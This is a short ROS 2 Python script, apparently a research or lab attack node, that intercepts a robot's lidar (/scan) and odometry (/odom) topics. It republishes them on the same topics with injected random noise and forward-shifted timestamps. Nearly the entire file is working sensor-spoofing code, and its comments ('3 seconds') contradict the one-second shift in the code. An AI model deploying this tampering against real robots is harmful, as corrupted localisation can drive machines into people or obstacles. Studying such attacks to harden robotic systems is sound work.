#!/bin/python3
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import LaserScan
from nav_msgs.msg import Odometry
from rclpy.duration import Duration
import random
import numpy as np
import time

class MiddleMan(Node):
    def __init__(self):
        super().__init__('middle_man')
        self.sub_scan = self.create_subscription(
            LaserScan,
            '/scan',
            self.listener_callback_scan,
            10)
        self.sub_odom = self.create_subscription(
            Odometry,
            '/odom',
            self.listener_callback_odom,
            10)
        self.pub_scan = self.create_publisher(
                LaserScan,
                '/scan',
                10)
        self.pub_odom = self.create_publisher(
                Odometry,
                '/odom',
                10)

    def listener_callback_scan(self, msg):
        # Add random noise to range data
        noise = 0.1  #  noise level
        origin = np.array(msg.ranges, dtype=float)
        noises = np.random.uniform(-noise, noise, origin.shape)
        msg.ranges = (origin + noises).tolist()

        # Update timestamp with an additional 3 seconds
        new_time = rclpy.time.Time.from_msg(msg.header.stamp) + Duration(seconds=1)
        msg.header.stamp = new_time.to_msg()
        self.pub_scan.publish(msg)
        # self.get_logger().info(f"{msg}")

    def listener_callback_odom(self, msg):
        # Add random noise to position
        noise = 0.05  # Adjust noise level to your needs
        msg.pose.pose.position.x += random.uniform(-noise, noise)
        msg.pose.pose.position.y += random.uniform(-noise, noise)
        msg.pose.pose.position.z += random.uniform(-noise, noise)

        # Add random noise to orientation
        noise = 0.02  # Small angle noise
        msg.pose.pose.orientation.z += random.uniform(-noise, noise)
        msg.pose.pose.orientation.w += random.uniform(-noise, noise)

        # Add 3 seconds to the timestamp
        new_time = rclpy.time.Time.from_msg(msg.header.stamp) + Duration(seconds=1)
        msg.header.stamp = new_time.to_msg()
        self.pub_odom.publish(msg)
        # self.get_logger().info(f"{msg}")

def main(args=None):
    rclpy.init(args=args)
    attacker = MiddleMan()
    rclpy.spin(attacker)
    # Cleanup and shutdown
    attacker.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
